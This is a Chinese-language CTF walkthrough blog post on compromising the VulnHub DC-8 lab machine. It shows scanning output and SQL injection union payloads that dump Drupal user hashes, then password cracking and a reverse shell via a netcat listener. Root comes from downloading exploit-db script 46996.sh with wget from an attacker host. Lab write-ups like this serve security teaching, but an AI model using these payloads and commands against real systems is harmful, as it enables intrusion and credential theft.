@@ -1,0 +1,675 @@
+---
+title: "VulnHub-DC8"
+layout: post
+date: 2021-12-22 20:57
+image: 
+headerImage: false
+tag:
+- web
+- vulnhub
+category: blog
+author: NoThxJ
+description: VulnHub
+---
+
+环境下载地址：<https://www.five86.com/dc-8.html>
+
+
+
+环境搭建：
+
+![1](https://havocykp.github.io/assets/images/img_blog10/1.png)
+
+
+
+信息收集
+
+探测目标IP
+
+用 netdiscover -r 192.168.2.0/24 扫描ip，得到目标ip 192.168.2.237
+
+![2](https://havocykp.github.io/assets/images/img_blog10/2.png)
+
+端口扫描
+
+利用nmap对目标主机进行综合扫描，发现开放端口：22 和 80
+
+命令：nmap -sT -sV -A -T5 192.168.2.237 -p-
+
+![3](https://havocykp.github.io/assets/images/img_blog10/3.png)
+
+访问网站：<http://192.168.2.237/>
+
+![4](https://havocykp.github.io/assets/images/img_blog10/4.png)
+
+插件识别
+
+![5](https://havocykp.github.io/assets/images/img_blog10/5.png)
+
+whatweb指纹识别
+
+![6](https://havocykp.github.io/assets/images/img_blog10/6.png)
+
+探测网站目录：
+
+① 使用 dirsearch 扫描站点
+
+命令：dirsearch -u <http://192.168.2.237>
+
+发现：/robots.txt （敏感信息）、/user 和 /user/login (登录后台)
+
+```javascript
+┌─[root@pendo]─[~]
+└──╼ #dirsearch -u http://192.168.2.237
+
+  _|. _ _  _  _  _ _|_    v0.4.1
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30
+Wordlist size: 10877
+
+Output File: /root/.dirsearch/reports/192.168.2.237/_21-09-17_00-40-28.txt
+
+Error Log: /root/.dirsearch/logs/errors-21-09-17_00-40-28.log
+
+Target: http://192.168.2.237/
+
+[00:40:28] Starting: 
+[00:40:28] 403 -  217B  - /%2e%2e;/test
+[00:40:30] 403 -  264B  - /.settings/org.eclipse.wst.common.project.facet.core.xml
+[00:40:30] 403 -  262B  - /.settings/org.eclipse.wst.jsdt.ui.superType.container
+[00:40:30] 403 -  214B  - /1.sql
+[00:40:30] 200 -    8KB - /0
+[00:40:30] 403 -  214B  - /2.sql
+[00:40:30] 403 -  217B  - /2010.sql
+[00:40:30] 403 -  217B  - /2011.sql
+[00:40:31] 403 -  217B  - /2012.sql
+[00:40:31] 403 -  217B  - /2013.sql
+[00:40:31] 403 -  217B  - /2014.sql
+[00:40:31] 403 -  217B  - /2015.sql
+[00:40:31] 403 -  217B  - /2016.sql
+[00:40:31] 403 -  217B  - /2017.sql
+[00:40:31] 403 -  217B  - /2018.sql
+[00:40:31] 403 -  217B  - /2019.sql
+[00:40:31] 403 -  217B  - /2020.sql
+[00:40:32] 403 -    7KB - /ADMIN
+[00:40:32] 403 -    7KB - /Admin/knowledge/dsmgr/users/UserManager.asp
+[00:40:32] 403 -    7KB - /Admin/knowledge/dsmgr/users/GroupManager.asp
+[00:40:32] 403 -    7KB - /Admin
+[00:40:32] 403 -    7KB - /Admin/login/
+[00:40:32] 200 -  111KB - /CHANGELOG.txt
+[00:40:32] 200 -    1KB - /COPYRIGHT.txt
+[00:40:33] 403 -  222B  - /INSTALL.mysql
+[00:40:33] 403 -  222B  - /INSTALL.pgsql
+[00:40:33] 200 -    2KB - /INSTALL.mysql.txt
+[00:40:33] 200 -    2KB - /INSTALL.pgsql.txt
+[00:40:33] 200 -   18KB - /INSTALL.txt
+[00:40:33] 200 -   18KB - /LICENSE.txt
+[00:40:33] 200 -    8KB - /MAINTAINERS.txt
+[00:40:34] 200 -    5KB - /README.txt
+[00:40:34] 403 -    7KB - /Search
+[00:40:34] 200 -   10KB - /UPGRADE.txt
+[00:40:36] 403 -  220B  - /_config.inc
+[00:40:37] 403 -  221B  - /accounts.sql
+[00:40:38] 403 -    7KB - /admin
+[00:40:38] 403 -    7KB - /admin%20/
+[00:40:38] 403 -  222B  - /admin/.config
+[00:40:38] 403 -  224B  - /admin/.htaccess
+[00:40:38] 403 -    7KB - /admin/
+[00:40:38] 403 -    7KB - /admin/_logs/access-log
+[00:40:38] 403 -    7KB - /admin/?/login
+[00:40:38] 403 -    7KB - /admin/_logs/err.log
+[00:40:38] 403 -    7KB - /admin/_logs/access_log
+[00:40:38] 403 -    7KB - /admin/_logs/error_log
+[00:40:38] 403 -    7KB - /admin/_logs/error-log
+[00:40:38] 403 -    7KB - /admin/_logs/access.log
+[00:40:38] 403 -    7KB - /admin/_logs/error.log
+[00:40:38] 403 -    7KB - /admin/_logs/login.txt
+[00:40:38] 403 -    7KB - /admin/access.txt
+[00:40:38] 403 -    7KB - /admin/account.php
+[00:40:38] 403 -    7KB - /admin/access.log
+[00:40:38] 403 -    7KB - /admin/access_log
+[00:40:38] 403 -    7KB - /admin/account.jsp
+[00:40:38] 403 -    7KB - /admin/account
+[00:40:38] 403 -    7KB - /admin/account.js
+[00:40:39] 403 -    7KB - /admin/admin-login
+[00:40:39] 403 -    7KB - /admin/account.aspx
+[00:40:39] 403 -    7KB - /admin/account.html
+[00:40:39] 403 -    7KB - /admin/admin-login.aspx
+[00:40:39] 403 -    7KB - /admin/admin-login.jsp
+[00:40:39] 403 -    7KB - /admin/admin
+[00:40:39] 403 -    7KB - /admin/admin-login.js
+[00:40:39] 403 -    7KB - /admin/admin-login.html
+[00:40:39] 403 -    7KB - /admin/admin-login.php
+[00:40:39] 403 -    7KB - /admin/admin.php
+[00:40:39] 403 -    7KB - /admin/admin.aspx
+[00:40:39] 403 -    7KB - /admin/admin.js
+[00:40:39] 403 -    7KB - /admin/admin/login
+[00:40:39] 403 -    7KB - /admin/admin_login.html
+[00:40:39] 403 -    7KB - /admin/admin.html
+[00:40:39] 403 -    7KB - /admin/adminLogin
+[00:40:39] 403 -    7KB - /admin/admin_login.php
+[00:40:39] 403 -    7KB - /admin/admin.jsp
+[00:40:39] 403 -    7KB - /admin/admin_login.aspx
+[00:40:39] 403 -    7KB - /admin/admin_login.js
+[00:40:39] 403 -    7KB - /admin/admin_login.jsp
+[00:40:39] 403 -    7KB - /admin/admin_login
+[00:40:39] 403 -    7KB - /admin/adminLogin.aspx
+[00:40:39] 403 -    7KB - /admin/backup/
+[00:40:39] 403 -    7KB - /admin/adminLogin.js
+[00:40:39] 403 -    7KB - /admin/adminLogin.jsp
+[00:40:39] 403 -    7KB - /admin/backups/
+[00:40:39] 403 -    7KB - /admin/adminLogin.php
+[00:40:39] 403 -    7KB - /admin/controlpanel.php
+[00:40:39] 403 -    7KB - /admin/config.php
+[00:40:39] 403 -    7KB - /admin/controlpanel
+[00:40:39] 403 -    7KB - /admin/controlpanel.aspx
+[00:40:39] 403 -    7KB - /admin/adminLogin.html
+[00:40:39] 403 -    7KB - /admin/controlpanel.jsp
+[00:40:39] 403 -    7KB - /admin/cp.php
+[00:40:39] 403 -    7KB - /admin/controlpanel.js
+[00:40:39] 403 -    7KB - /admin/controlpanel.html
+[00:40:39] 403 -    7KB - /admin/cp.jsp
+[00:40:39] 403 -    7KB - /admin/cp.aspx
+[00:40:39] 403 -    7KB - /admin/cp.html
+[00:40:39] 403 -    7KB - /admin/db/
+[00:40:39] 403 -    7KB - /admin/cp
+[00:40:39] 403 -    7KB - /admin/dumper/
+[00:40:39] 403 -    7KB - /admin/cp.js
+[00:40:39] 403 -    7KB - /admin/default.asp
+[00:40:39] 403 -    7KB - /admin/default
+[00:40:39] 403 -    7KB - /admin/default/admin.asp
+[00:40:39] 403 -    7KB - /admin/download.php
+[00:40:39] 403 -    7KB - /admin/error.log
+[00:40:39] 403 -    7KB - /admin/default/login.asp
+[00:40:39] 403 -    7KB - /admin/export.php
+[00:40:39] 403 -    7KB - /admin/FCKeditor
+[00:40:39] 403 -    7KB - /admin/error.txt
+[00:40:39] 403 -    7KB - /admin/fckeditor/editor/filemanager/browser/default/connectors/php/connector.php
+[00:40:39] 403 -    7KB - /admin/fckeditor/editor/filemanager/connectors/asp/upload.asp
+[00:40:39] 403 -    7KB - /admin/fckeditor/editor/filemanager/connectors/aspx/upload.aspx
+[00:40:39] 403 -    7KB - /admin/fckeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx
+[00:40:39] 403 -    7KB - /admin/fckeditor/editor/filemanager/connectors/asp/connector.asp
+[00:40:39] 403 -    7KB - /admin/fckeditor/editor/filemanager/connectors/php/upload.php
+[00:40:39] 403 -    7KB - /admin/error_log
+[00:40:39] 403 -    7KB - /admin/fckeditor/editor/filemanager/connectors/php/connector.php
+[00:40:39] 403 -    7KB - /admin/fckeditor/editor/filemanager/upload/aspx/upload.aspx
+[00:40:39] 403 -    7KB - /admin/fckeditor/editor/filemanager/connectors/aspx/connector.aspx
+[00:40:39] 403 -    7KB - /admin/file.php
+[00:40:39] 403 -    7KB - /admin/fckeditor/editor/filemanager/upload/php/upload.php
+[00:40:39] 403 -    7KB - /admin/fckeditor/editor/filemanager/upload/asp/upload.asp
+[00:40:39] 403 -    7KB - /admin/home
+[00:40:39] 403 -    7KB - /admin/fckeditor/editor/filemanager/browser/default/connectors/asp/connector.asp
+[00:40:39] 403 -    7KB - /admin/home.aspx
+[00:40:39] 403 -    7KB - /admin/files.php
+[00:40:39] 403 -    7KB - /admin/home.php
+[00:40:39] 403 -    7KB - /admin/home.jsp
+[00:40:39] 403 -    7KB - /admin/includes/configure.php~
+[00:40:39] 403 -    7KB - /admin/index.aspx
+[00:40:39] 403 -    7KB - /admin/home.html
+[00:40:39] 403 -    7KB - /admin/index.html
+[00:40:39] 403 -    7KB - /admin/index.php
+[00:40:39] 403 -    7KB - /admin/home.js
+[00:40:39] 403 -    7KB - /admin/index.js
+[00:40:39] 403 -    7KB - /admin/index
+[00:40:39] 403 -    7KB - /admin/index.jsp
+[00:40:39] 403 -    7KB - /admin/js/tiny_mce/
+[00:40:39] 403 -    7KB - /admin/js/tiny_mce
+[00:40:39] 403 -    7KB - /admin/js/tinymce
+[00:40:39] 403 -    7KB - /admin/log
+[00:40:39] 403 -    7KB - /admin/login.aspx
+[00:40:39] 403 -    7KB - /admin/login
+[00:40:39] 403 -    7KB - /admin/js/tinymce/
+[00:40:39] 403 -    7KB - /admin/login.js
+[00:40:39] 403 -    7KB - /admin/login.php
+[00:40:39] 403 -    7KB - /admin/login.jsp
+[00:40:39] 403 -    7KB - /admin/login.asp
+[00:40:39] 403 -    7KB - /admin/login.py
+[00:40:39] 403 -    7KB - /admin/login.rb
+[00:40:39] 403 -    7KB - /admin/login.html
+[00:40:39] 403 -    7KB - /admin/login.htm
+[00:40:39] 403 -    7KB - /admin/login.do
+[00:40:39] 403 -    7KB - /admin/logs/
+[00:40:39] 403 -    7KB - /admin/logs/access.log
+[00:40:39] 403 -    7KB - /admin/logon.jsp
+[00:40:39] 403 -    7KB - /admin/logs/access-log
+[00:40:39] 403 -    7KB - /admin/logs/access_log
+[00:40:39] 403 -    7KB - /admin/logs/error-log
+[00:40:39] 403 -    7KB - /admin/logs/err.log
+[00:40:39] 403 -    7KB - /admin/manage/admin.asp
+[00:40:39] 403 -    7KB - /admin/manage/login.asp
+[00:40:39] 403 -    7KB - /admin/mysql/
+[00:40:39] 403 -    7KB - /admin/logs/login.txt
+[00:40:39] 403 -    7KB - /admin/manage
+[00:40:39] 403 -    7KB - /admin/logs/error.log
+[00:40:39] 403 -    7KB - /admin/manage.asp
+[00:40:39] 403 -    7KB - /admin/logs/error_log
+[00:40:39] 403 -    7KB - /admin/phpMyAdmin
+[00:40:39] 403 -    7KB - /admin/mysql2/index.php
+[00:40:39] 403 -    7KB - /admin/mysql/index.php
+[00:40:39] 403 -    7KB - /admin/phpMyAdmin/
+[00:40:39] 403 -    7KB - /admin/phpmyadmin/
+[00:40:39] 403 -    7KB - /admin/pMA/
+[00:40:39] 403 -    7KB - /admin/phpmyadmin/index.php
+[00:40:39] 403 -    7KB - /admin/portalcollect.php?f=http://xxx&t=js
+[00:40:39] 403 -    7KB - /admin/pma/index.php
+[00:40:39] 403 -    7KB - /admin/phpMyAdmin/index.php
+[00:40:39] 403 -    7KB - /admin/phpmyadmin2/index.php
+[00:40:39] 403 -    7KB - /admin/private/logs
+[00:40:39] 403 -    7KB - /admin/pma/
+[00:40:39] 403 -    7KB - /admin/sqladmin/
+[00:40:39] 403 -    7KB - /admin/release
+[00:40:39] 403 -    7KB - /admin/PMA/index.php
+[00:40:39] 403 -    7KB - /admin/upload.php
+[00:40:39] 403 -    7KB - /admin/pol_log.txt
+[00:40:39] 403 -    7KB - /admin/scripts/fckeditor
+[00:40:39] 403 -    7KB - /admin/signin
+[00:40:39] 403 -    7KB - /admin/secure/logon.jsp
+[00:40:39] 403 -    7KB - /admin/sysadmin/
+[00:40:39] 403 -    7KB - /admin/tiny_mce
+[00:40:39] 403 -    7KB - /admin/user_count.txt
+[00:40:39] 403 -    7KB - /admin/sxd/
+[00:40:39] 403 -    7KB - /admin/tinymce
+[00:40:39] 403 -    7KB - /admin/uploads.php
+[00:40:39] 403 -    7KB - /admin/web/
+[00:40:44] 403 -  232B  - /administrator/.htaccess
+[00:40:45] 403 -  224B  - /admrev/.ftppass
+[00:40:45] 403 -  219B  - /adovbs.inc
+[00:40:45] 403 -  224B  - /admpar/.ftppass
+[00:40:45] 403 -  223B  - /affiliates.sql
+[00:40:45] 403 -  222B  - /app/.htaccess
+[00:40:46] 403 -  220B  - /archive.sql
+[00:40:46] 403 -  217B  - /auth.inc
+[00:40:46] 403 -  217B  - /back.sql
+[00:40:47] 403 -  219B  - /backup.inc
+[00:40:47] 403 -    3KB - /authorize.php
+[00:40:47] 403 -  219B  - /backup.sql
+[00:40:47] 403 -  220B  - /backups.inc
+[00:40:47] 403 -  220B  - /backups.sql
+[00:40:47] 403 -  225B  - /bitrix/.settings
+[00:40:47] 403 -  229B  - /bitrix/.settings.php
+[00:40:47] 403 -  229B  - /bitrix/.settings.bak
+[00:40:47] 403 -  233B  - /bitrix/.settings.php.bak
+[00:40:48] 403 -  217B  - /buck.sql
+[00:40:48] 403 -  217B  - /build.sh
+[00:40:49] 403 -  220B  - /clients.sql
+[00:40:49] 403 -  219B  - /common.inc
+[00:40:49] 403 -  222B  - /composer.json
+[00:40:49] 403 -  222B  - /composer.lock
+[00:40:49] 403 -  222B  - /conf.inc.php~
+[00:40:49] 403 -  221B  - /conf.php.bak
+[00:40:49] 403 -  221B  - /conf.php.swp
+[00:40:49] 403 -  223B  - /config.inc.bak
+[00:40:49] 403 -  219B  - /config.inc
+[00:40:49] 403 -  224B  - /config.inc.php~
+[00:40:49] 403 -  220B  - /config.inc~
+[00:40:49] 403 -  226B  - /config.local.php~
+[00:40:49] 403 -  223B  - /config.php.bak
+[00:40:49] 403 -  224B  - /config.php.inc~
+[00:40:49] 403 -  223B  - /config.php.inc
+[00:40:49] 403 -  220B  - /config.php~
+[00:40:49] 403 -  223B  - /config.php.swp
+[00:40:49] 403 -  219B  - /config.sql
+[00:40:50] 403 -  231B  - /configuration.inc.php~
+[00:40:50] 403 -  230B  - /configuration.php.bak
+[00:40:50] 403 -  230B  - /configuration.php.swp
+[00:40:50] 403 -  226B  - /configure.php.bak
+[00:40:50] 403 -  227B  - /configuration.php~
+[00:40:50] 403 -  220B  - /connect.inc
+[00:40:51] 403 -  216B  - /cron.sh
+[00:40:51] 403 -  222B  - /customers.sql
+[00:40:51] 403 -    7KB - /cron.php
+[00:40:51] 403 -  217B  - /data.sql
+[00:40:51] 403 -  221B  - /database.inc
+[00:40:51] 403 -  221B  - /database.sql
+[00:40:51] 403 -  227B  - /database.yml.pgsql
+[00:40:51] 403 -  233B  - /database_credentials.inc
+[00:40:51] 403 -  222B  - /db-full.mysql
+[00:40:51] 403 -  215B  - /db.inc
+[00:40:51] 403 -  215B  - /db.sql
+[00:40:51] 403 -  222B  - /db_backup.sql
+[00:40:51] 403 -  218B  - /dbase.sql
+[00:40:51] 403 -  219B  - /dbdump.sql
+[00:40:51] 403 -  218B  - /debug.inc
+[00:40:52] 403 -  220B  - /df_main.sql
+[00:40:52] 403 -  217B  - /dump.inc
+[00:40:52] 403 -  216B  - /dump.sh
+[00:40:52] 403 -  217B  - /dump.sql
+[00:40:53] 403 -  218B  - /error.tpl
+[00:40:53] 403 -  219B  - /error1.tpl
+[00:40:53] 403 -  219B  - /errors.tpl
+[00:40:53] 403 -  218B  - /ext/.deps
+[00:40:54] 403 -  218B  - /forum.sql
+[00:40:55] 403 -  220B  - /globals.inc
+[00:40:56] 403 -  231B  - /includes/bootstrap.inc
+[00:40:56] 403 -  218B  - /includes/
+[00:40:56] 403 -  228B  - /includes/adovbs.inc
+[00:40:56] 301 -  238B  - /includes  ->  http://192.168.2.237/includes/
+[00:40:56] 403 -  232B  - /includes/configure.php~
+[00:40:56] 403 -  218B  - /index.inc
+[00:40:56] 403 -  222B  - /index.php.bak
+[00:40:56] 403 -  219B  - /index.php~
+[00:40:56] 200 -    8KB - /index.php
+[00:40:57] 403 -  220B  - /install.inc
+[00:40:57] 403 -  222B  - /install.mysql
+[00:40:57] 403 -  220B  - /install.tpl
+[00:40:57] 403 -  222B  - /install.pgsql
+[00:40:57] 403 -  220B  - /install.sql
+[00:40:57] 200 -    3KB - /install.php
+[00:40:58] 403 -  242B  - /lib/flex/uploader/.flexProperties
+[00:40:58] 403 -  250B  - /lib/flex/uploader/.actionScriptProperties
+[00:40:58] 403 -  236B  - /lib/flex/uploader/.settings
+[00:40:58] 403 -  233B  - /lib/flex/varien/.project
+[00:40:58] 403 -  235B  - /lib/flex/uploader/.project
+[00:40:58] 403 -  248B  - /lib/flex/varien/.actionScriptProperties
+[00:40:58] 403 -  234B  - /lib/flex/varien/.settings
+[00:40:58] 403 -  243B  - /lib/flex/varien/.flexLibProperties
+[00:40:58] 403 -  227B  - /local_conf.php.bak
+[00:40:58] 403 -  222B  - /localhost.sql
+[00:40:58] 403 -  230B  - /localsettings.php.bak
+[00:40:58] 403 -  230B  - /localsettings.php.swp
+[00:40:58] 403 -  227B  - /localsettings.php~
+[00:40:59] 403 -  218B  - /ltmain.sh
+[00:40:59] 403 -  220B  - /mailer/.env
+[00:41:00] 403 -  220B  - /members.sql
+[00:41:00] 301 -  234B  - /misc  ->  http://192.168.2.237/misc/
+[00:41:01] 301 -  237B  - /modules  ->  http://192.168.2.237/modules/
+[00:41:01] 403 -  217B  - /modules/
+[00:41:01] 403 -  218B  - /mysql.sql
+[00:41:01] 403 -  224B  - /mysql_debug.sql
+[00:41:02] 200 -    7KB - /node
+[00:41:02] 403 -  219B  - /orders.sql
+[00:41:06] 301 -  238B  - /profiles  ->  http://192.168.2.237/profiles/
+[00:41:06] 403 -  240B  - /profiles/standard/standard.info
+[00:41:06] 403 -  238B  - /profiles/minimal/minimal.info
+[00:41:06] 403 -  238B  - /profiles/testing/testing.info
+[00:41:06] 403 -  245B  - /resources/.arch-internal-preview.css
+[00:41:06] 403 -  236B  - /resources/sass/.sass-cache/
+[00:41:07] 403 -  221B  - /revision.inc
+[00:41:07] 200 -    2KB - /robots.txt
+[00:41:07] 403 -  215B  - /run.sh
+[00:41:07] 403 -  218B  - /sales.sql
+[00:41:07] 403 -  219B  - /schema.sql
+[00:41:07] 301 -  237B  - /scripts  ->  http://192.168.2.237/scripts/
+[00:41:07] 403 -  217B  - /scripts/
+[00:41:07] 403 -    7KB - /search
+[00:41:07] 403 -  222B  - /server-status
+[00:41:07] 403 -  223B  - /server-status/
+[00:41:08] 403 -  225B  - /settings.php.bak
+[00:41:08] 403 -  225B  - /settings.php.swp
+[00:41:08] 403 -  222B  - /settings.php~
+[00:41:08] 403 -  218B  - /setup.sql
+[00:41:08] 403 -  217B  - /shell.sh
+[00:41:08] 403 -  217B  - /site.sql
+[00:41:09] 301 -  235B  - /sites  ->  http://192.168.2.237/sites/
+[00:41:09] 200 -    1KB - /sites/all/modules/README.txt
+[00:41:09] 200 -  151B  - /sites/all/libraries/README.txt
+[00:41:09] 200 - 1020B  - /sites/all/themes/README.txt
+[00:41:09] 200 -    0B  - /sites/example.sites.php
+[00:41:09] 200 -  904B  - /sites/README.txt
+[00:41:09] 403 -  216B  - /sql.sql
+[00:41:09] 403 -  216B  - /sql.inc
+[00:41:09] 403 -  220B  - /sqldump.sql
+[00:41:09] 403 -  217B  - /start.sh
+[00:41:09] 403 -  219B  - /startup.sh
+[00:41:10] 403 -  217B  - /temp.sql
+[00:41:11] 301 -  236B  - /themes  ->  http://192.168.2.237/themes/
+[00:41:11] 403 -  216B  - /themes/
+[00:41:12] 403 -  221B  - /twitter/.env
+[00:41:12] 403 -    4KB - /update.php
+[00:41:12] 200 -    8KB - /user/
+[00:41:12] 403 -  218B  - /users.sql
+[00:41:12] 200 -    8KB - /user
+[00:41:12] 200 -    8KB - /user/login/
+[00:41:13] 403 -  215B  - /vb.sql
+[00:41:13] 200 -    2KB - /web.config
+[00:41:13] 403 -  216B  - /web.sql
+[00:41:14] 403 -  222B  - /wp-config.inc
+[00:41:14] 403 -  226B  - /wp-config.php.inc
+[00:41:14] 403 -  226B  - /wp-config.php.bak
+[00:41:14] 403 -  226B  - /wp-config.php.swp
+[00:41:14] 403 -  223B  - /wp-config.php~
+[00:41:14] 403 -  216B  - /www.sql
+[00:41:15] 403 -  220B  - /wwwroot.sql
+[00:41:15] 200 -   42B  - /xmlrpc.php
+
+Task Completed
+```
+
+![7](https://havocykp.github.io/assets/images/img_blog10/7.png)
+
+② 使用 dirb 扫描站点
+
+命令：dirb http://192.168.2.237
+
+扫描结果同 dirsearch
+
+
+
+③ 使用 nikto 扫描站点
+
+命令：nikto -h http://192.168.2.237
+
+扫描结果同 dirsearch
+
+![8](https://havocykp.github.io/assets/images/img_blog10/8.png)
+
+点了点页面链接，发现有传参，猜测可能存在注入，进行测试
+
+如果点击红框内容，url显示为：
+
+<http://192.168.2.237/node/2>
+
+![9](https://havocykp.github.io/assets/images/img_blog10/9.png)
+
+倘若点击下面红框，则url显示：
+
+<http://192.168.2.237/?nid=1>
+
+![10](https://havocykp.github.io/assets/images/img_blog10/10.png)
+
+
+
+Sql注入
+
+经过测试发现存在sql注入
+
+① 单引号报错
+
+尝试单引号报错，从报错的信息中发现数据库查询语句
+
+![11](https://havocykp.github.io/assets/images/img_blog10/11.png)
+
+② 判断SQL注入类型
+
+构造payload尝试数字型SQL注入，页面显示正常
+
+<http://192.168.2.237/?nid=1> and 1=1
+
+![12](https://havocykp.github.io/assets/images/img_blog10/12.png)
+
+页面显示不正常，于是断定此处存在数字型SQL注入漏洞
+
+<http://192.168.2.237/?nid=1> and 1=2
+
+![13](https://havocykp.github.io/assets/images/img_blog10/13.png)
+
+③ 猜测列数
+
+order by 猜测当前表的数据列数，当猜测列数为1的时候显示正常
+
+![14](https://havocykp.github.io/assets/images/img_blog10/14.png)
+
+列数为2的时候显示不正常，所以断定当前表的列数为1列
+
+![15](https://havocykp.github.io/assets/images/img_blog10/15.png)
+
+④ union 联合注入
+
+1. 查看数据回显位
+
+![16](https://havocykp.github.io/assets/images/img_blog10/16.png)
+
+2. 查看当前数据库
+
+<http://192.168.2.237/?nid=0> union select database()
+
+![17](https://havocykp.github.io/assets/images/img_blog10/17.png)
+
+3. 查看d7db数据库下的所有表，可以看到一个users表
+
+<http://192.168.2.237/?nid=0> union select group_concat(table_name) from information_schema.tables where table_schema= 'd7db '
+
+![18](https://havocykp.github.io/assets/images/img_blog10/18.png)
+
+4. 查看users表下的字段，发现name和pss字段
+
+<http://192.168.2.237/?nid=0> union select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'
+
+![19](https://havocykp.github.io/assets/images/img_blog10/19.png)
+
+5. 查看信息得到两组账号/密码
+
+<http://192.168.2.237/?nid=0> union select group_concat(name,':',pass) from d7db.users
+
+admin:$S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z
+
+john:$S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF
+
+![20](https://havocykp.github.io/assets/images/img_blog10/20.png)
+
+⑥ hash解密
+
+将用户名和密码密文保存到 dc8-hash.txt中
+
+vim dc8-hash.txt
+
+admin:$S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z
+
+john:$S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF
+
+
+
+用户名有一个john，可能是要john工具爆破密码，这里直接使用john爆破，使用john的默认字典，爆出john的密码，admin的密码没有爆出
+
+命令：john dc8-hash.txt
+
+john:turtle
+
+![21](https://havocykp.github.io/assets/images/img_blog10/21.png)
+
+GetShell
+
+在 <http://192.168.2.237/user> 进行登录
+
+![22](https://havocykp.github.io/assets/images/img_blog10/22.png)
+
+在 Contact us 中发现php代码执行漏洞
+
+该漏洞在表单提交时才会触发
+
+这里自带的格式不要删除，否则会后端读取的时候会报错导致无法执行php代码
+
+![23](https://havocykp.github.io/assets/images/img_blog10/23.png)
+
+在攻击机上端口监听： nc -lvvp 9999 
+
+![24](https://havocykp.github.io/assets/images/img_blog10/24.png)
+
+提交表单（在此之前需要监听对应端口）
+
+![25](https://havocykp.github.io/assets/images/img_blog10/25.png)
+
+反弹shell
+
+![26](https://havocykp.github.io/assets/images/img_blog10/26.png)
+
+提权
+
+1. 先获取一个完全交互的shell
+
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+![27](https://havocykp.github.io/assets/images/img_blog10/27.png)
+
+2. 通过find查看可执行的命令
+
+linux 里面有个suid权限执行二进制文件，我们用 find 命令查询
+
+find / -perm -u=s -type f 2>/dev/null
+
+![28](https://havocykp.github.io/assets/images/img_blog10/28.png)
+
+发现一个 exim4
+
+3. 利用 exim4 漏洞提权
+
+命令：searchsploit exim
+
+![29](https://havocykp.github.io/assets/images/img_blog10/29.png)
+
+查看对应版本，发现是 4.89，在 exim 4.87 - 4.91 的版本都存在本地提权漏洞
+
+/usr/sbin/exim4 --version
+
+![30](https://havocykp.github.io/assets/images/img_blog10/30.png)
+
+将提权脚本复制到 攻击机目录下，开启HTTP服务
+
+![31](https://havocykp.github.io/assets/images/img_blog10/31.png)
+
+在当前路径开启 python.server，供DC-8下载（python3与python2有区别）
+
+```javascript
+┌─[pendo@pendo]─[~]
+└──╼ $cp /usr/share/exploitdb/exploits/linux/local/46996.sh /home/pendo
+┌─[✗]─[pendo@pendo]─[~]
+└──╼ $python3 -m http.server 9999
+```
+
+![32](https://havocykp.github.io/assets/images/img_blog10/32.png)
+
+在目标机上下载脚本
+
+使用 ls -la 查看目录的权限，发现 /tmp 目录有写入的权限
+
+![33](https://havocykp.github.io/assets/images/img_blog10/33.png)
+
+切换路径到 /tmp目录下
+
+wget <http://192.168.2.110:9999/46996.sh>
+
+![34](https://havocykp.github.io/assets/images/img_blog10/34.png)
+
+![35](https://havocykp.github.io/assets/images/img_blog10/35.png)
+
+根据报错的内容进一步了解后发现
+
+执行脚本的时候提示 “/bin/bash^M: bad interpreter: No such file or directory” 的错误是由于脚本文件是 dos 格式，即每一行结尾以 \r\n 来标识，而 unix 格式的文件结尾以 \n 来标识
+
+查看脚本文件是dos格式还是unix格式的几种办法
+
+![36](https://havocykp.github.io/assets/images/img_blog10/36.png)
+
+解决方法：
+
+![37](https://havocykp.github.io/assets/images/img_blog10/37.png)
+
+![38](https://havocykp.github.io/assets/images/img_blog10/38.png)
+
+转换格式后，运行脚本发现还不能成功提权
+
+sed -i "s/\r//" 46996.sh
+
+![39](https://havocykp.github.io/assets/images/img_blog10/39.png)
+
+查看脚本内容，发现有两种执行方式
+
+![40](https://havocykp.github.io/assets/images/img_blog10/40.png)
+
+![41](https://havocykp.github.io/assets/images/img_blog10/41.png)
+
+在 root 目录下找到 flag.txt
+
+![42](https://havocykp.github.io/assets/images/img_blog10/42.png)
+
